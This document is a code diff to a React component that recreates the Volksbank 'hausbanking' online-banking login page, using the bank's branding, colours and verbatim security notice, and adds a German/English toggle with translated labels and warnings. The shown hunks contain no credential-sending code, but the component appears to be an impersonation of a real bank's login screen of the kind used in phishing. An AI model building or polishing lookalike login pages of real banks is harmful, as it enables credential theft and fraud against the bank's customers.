@@ -6,6 +6,7 @@ import volksbankBg from "@/assets/volksbank-bg.png";
 const Volksbank = () => {
   const [username, setUsername] = useState("");
   const [isFocused, setIsFocused] = useState(false);
+  const [lang, setLang] = useState<"de" | "en">("de");
 
   return (
     <div className="min-h-screen flex flex-col">
@@ -32,15 +33,16 @@ const Volksbank = () => {
             className="px-6 py-4 text-white font-semibold text-xl"
             style={{ backgroundColor: "#196bc1" }}
           >
-            hausbanking Login
+            {lang === "de" ? "hausbanking Login" : "Login"}
           </div>
 
           {/* Card body */}
           <div className="bg-white px-6 py-5 space-y-4">
             {/* Info text */}
             <p className="text-base leading-snug" style={{ color: "#333" }}>
-              Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre
-              Zugangsdaten auf keiner Ihnen unbekannten Seite eingeben und diese geheim halten.
+              {lang === "de"
+                ? "Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner Ihnen unbekannten Seite eingeben und diese geheim halten."
+                : "You can register for your new online banking service here. When you log in, a secure connection is established. Please make sure that you do not enter your access details on any other site and keep them secret. We will never ask you for your PIN or a TAN."}
             </p>
 
             {/* Divider */}
@@ -49,11 +51,18 @@ const Volksbank = () => {
             {/* Label row */}
             <div className="flex items-center justify-between">
               <span className="font-semibold text-xs" style={{ color: "#999" }}>
-                Anmeldung mit Benutzername
+                {lang === "de" ? "Anmeldung mit Benutzername" : "User name or authorised party number"}
               </span>
               <span className="text-sm space-x-2">
-                <a href="#" onClick={(e) => e.preventDefault()} style={{ color: "#196bc1" }}>
-                  English
+                <a
+                  href="#"
+                  onClick={(e) => {
+                    e.preventDefault();
+                    setLang(lang === "de" ? "en" : "de");
+                  }}
+                  style={{ color: "#196bc1" }}
+                >
+                  {lang === "de" ? "English" : "Deutsch"}
                 </a>
               </span>
             </div>
@@ -93,16 +102,18 @@ const Volksbank = () => {
               className="w-full py-3 text-white font-semibold rounded text-sm"
               style={{ backgroundColor: "#196bc1" }}
             >
-              Weiter
+              {lang === "de" ? "Weiter" : "Continue"}
             </button>
 
             {/* Divider below button */}
             <hr className="-mx-6 border-gray-200" />
 
-            {/* Terms text */}
-            <p className="text-[15px] text-center" style={{ color: "#333" }}>
-              Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den Nutzungsbedingungen der Bank ausdrücklich zu.
-            </p>
+            {/* Terms text - only in German */}
+            {lang === "de" && (
+              <p className="text-[15px] text-center" style={{ color: "#333" }}>
+                Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den Nutzungsbedingungen der Bank ausdrücklich zu.
+              </p>
+            )}
 
             {/* Links */}
             <div className="flex flex-col items-center" style={{ gap: 0 }}>
@@ -112,7 +123,7 @@ const Volksbank = () => {
                 className="text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                 style={{ color: "#196bc1" }}
               >
-                Benutzername vergessen?
+                {lang === "de" ? "Benutzername vergessen?" : "Forgot username?"}
               </a>
               <a
                 href="#"
@@ -120,7 +131,7 @@ const Volksbank = () => {
                 className="text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                 style={{ color: "#196bc1" }}
               >
-                Passwort vergessen?
+                {lang === "de" ? "Passwort vergessen?" : "Forgot password?"}
               </a>
             </div>
           </div>
